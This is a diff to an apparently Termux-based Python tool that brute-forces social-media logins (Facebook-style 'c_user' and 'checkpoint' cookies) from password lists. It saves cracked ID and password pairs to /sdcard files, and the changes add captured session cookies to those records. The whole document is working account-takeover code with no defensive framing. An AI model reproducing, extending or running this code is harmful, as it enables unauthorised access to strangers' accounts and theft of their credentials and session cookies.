@@ -402,7 +402,6 @@ def method1(ids,names,passlist,total_ids):
             next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
             cookies = r.cookies.get_dict().keys()
             if 'c_user' in cookies:
-                os.system("play-audio HAMII_OK.mp3")
                 print('\r\033[1;32m[HAMII-OK] '+ids+' | '+pas+'\033[1;97m')
                 ok.append(ids)
                 open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
@@ -411,14 +410,12 @@ def method1(ids,names,passlist,total_ids):
                 d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d):
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;35m[HAMII-2F] '+ids+' | '+pas+'\033[1;97m')
+                    #print(#'\r\033[1;35m[HAMII-2F] '+ids#+' | '#+pas#+'\033[0;97m#')
                     tf.append(ids)
                     open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system("play-audio HAMII_CP.mp3")
-                    print('\r\033[1;31m[HAMII-CP] '+ids+' | '+pas+'\033[1;97m')
+                    # print(#'\r\033[1;31m[HAMII-CP] '+ids#+' | '#+pas#+'\033[0;97m'#)
                     cp.append(ids)
                     open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
@@ -459,23 +456,20 @@ def method2(ids,names,passlist,total_ids):
             cookies = session.cookies.get_dict().keys()
             #open('jhuk.html', 'w').write(post_request)
             if 'c_user' in cookies:
-                os.system("play-audio HAMII_OK.mp3")
                 print('\r\033[1;32m[HAMII-OK] '+ids+' | '+pas+'\033[0;97m')
                 ok.append(ids)
-                open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                open('/sdcard/HAMII_OK.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                 break
             elif 'checkpoint' in cookies:
                 d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d.group(1)):
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;35m[HAMII-2F] '+ids+' | '+pas+'\033[0;97m')
+                    #print(#'\r\033[1;35m[HAMII-2F] '+ids#+' | '#+pas#+'\033[0;97m#')
                     tf.append(ids)
                     open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system("play-audio HAMII_CP.mp3")
-                    print('\r\033[1;31m[HAMII-CP] '+ids+' | '+pas+'\033[0;97m')
+                   # print(#'\r\033[1;31m[HAMII-CP] '+ids#+' | '#+pas#+'\033[0;97m'#)
                     cp.append(ids)
                     open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
@@ -540,7 +534,7 @@ def random_method(ids,passlist,total_ids):
                     os.system("play-audio HAMII_OK.mp3")
                     print('\r\033[1;92m[HAMII-OK] '+cid+' | '+pas+'\033[0;97m')
                     ok.append(cid)
-                    open('/sdcard/HAMII_OK.txt', 'a').write(cid+' | '+pas+'\n')
+                    open('/sdcard/HAMII_OK.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                     break
             elif 'checkpoint' in cookies:
                 coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
@@ -553,7 +547,7 @@ def random_method(ids,passlist,total_ids):
                         os.system("play-audio HAMII_2F.mp3")
                         print('\r\033[1;95m[HAMII-2F] '+cid+' | '+pas+'\033[0;97m')
                         tf.append(cid)
-                        open('/sdcard/HAMII_2F.txt', 'a').write(cid+' | '+pas+'\n')
+                        open('/sdcard/HAMII_2F.txt', 'a').write(cid+'|'+pas+'|'+coki+'\n')
                         break
                     else:
                         if cid in cp:
@@ -1151,7 +1145,7 @@ def freeq(uid,pwx,tl):
                 os.system("play-audio HAMII_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/HAMII-OK.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
